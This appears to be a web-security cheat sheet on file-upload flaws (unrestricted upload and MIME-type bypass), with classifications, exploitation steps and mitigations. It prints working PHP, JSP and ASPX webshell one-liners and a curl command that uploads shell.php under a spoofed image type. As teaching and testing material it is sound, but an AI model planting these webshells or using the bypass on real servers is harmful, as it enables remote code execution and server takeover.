📌 1. Unrestricted File Upload

What is Unrestricted File Upload?

The application allows uploading any file type without any validation. Attackers can upload malicious files (PHP, JSP, ASPX, etc.) to execute code on the server.

Why does it occur?

Lack of input validation on file types, missing extension checks, and no content verification.

Security principle violated: Input Validation / Secure Configuration

🏷️ Classification

  • Type: Unrestricted File Upload
  • OWASP: A05:2021 – Security Misconfiguration
  • CWE: CWE-434: Unrestricted Upload of File with Dangerous Type

🎯 Attack Surface

  • ✅ Profile picture upload
  • ✅ Document/Attachment upload
  • ✅ Theme/Plugin upload (WordPress, etc.)
  • ✅ CSV/Excel import features

💣 Basic Payloads

shell.php
shell.jsp
shell.aspx
shell.phtml
shell.php5
shell.php7
shell.Php (case manipulation)
shell.PHP
<?php system($_GET['cmd']); ?>           # PHP webshell
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>   # JSP webshell
<%@ Page Language="Jscript"%><%eval(Request.Item["cmd"],"unsafe");%>   # ASPX webshell

⚙️ Exploitation Steps

  1. Identify file upload functionality
  2. Attempt to upload shell.php
  3. If successful, navigate to uploaded file
  4. Execute commands via webshell

🛡️ Mitigation

✅ Allowlist Extensions: Only allow safe extensions (jpg, png, gif, pdf, txt)
✅ Validate File Content: Check magic bytes, not just extension
✅ Rename Uploaded Files: Use random names, remove original extension
✅ Store Files Outside Webroot: Prevent direct access
✅ Disable Execution: Configure upload directory to disable script execution

⚠️ Risk / Impact

Severity: Critical

Impact: Remote Code Execution, Complete Server Compromise, Data Theft, Defacement

📎 Proof of Concept (PoC)

# Upload shell.php containing:
<?php system($_GET['cmd']); ?>

# Access the uploaded file:
https://target.com/uploads/shell.php?cmd=id

# Response shows command output

📌 2. MIME Type Bypass

What is MIME Type Bypass?

The server checks only the Content-Type header. Attackers can modify the MIME type to bypass validation.

Why does it occur?

Server trusts client-supplied Content-Type header instead of validating actual file content.

Security principle violated: Input Validation / Trust Boundary

🏷️ Classification

  • Type: MIME Type Bypass
  • OWASP: A05:2021 – Security Misconfiguration
  • CWE: CWE-434: Unrestricted Upload

🎯 Attack Surface

  • ✅ File upload endpoints with Content-Type validation only
  • ✅ API endpoints accepting multipart/form-data

💣 Basic Payloads

# Intercept request and change Content-Type header
Content-Type: application/x-php
to
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: application/pdf
# Using curl
curl -F "file=@shell.php;type=image/jpeg" https://target.com/upload

# Using Burp Suite - modify Content-Type in Repeater

⚙️ Exploitation Steps

  1. Intercept file upload request in Burp Suite
  2. Change Content-Type header to allowed type (image/jpeg)
  3. Forward request and check if upload succeeded
  4. Access uploaded shell to confirm execution

🛡️ Mitigation

✅ Validate File Content: Check magic bytes/file signatures, not Content-Type header
✅ Use Server-Side Validation: Never trust client-supplied headers
✅ Implement File Type Detection: Use libraries like file, libmagic, or finfo 
# PHP - Validate actual file type
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime_type = finfo_file($finfo, $_FILES['file']['tmp_name']);
if (!in_array($mime_type, ['image/jpeg', 'image/png'])) {
    die('Invalid file type');
}

⚠️ Risk / Impact

Severity: High to Critical

Impact: Remote Code Execution, Server Compromise
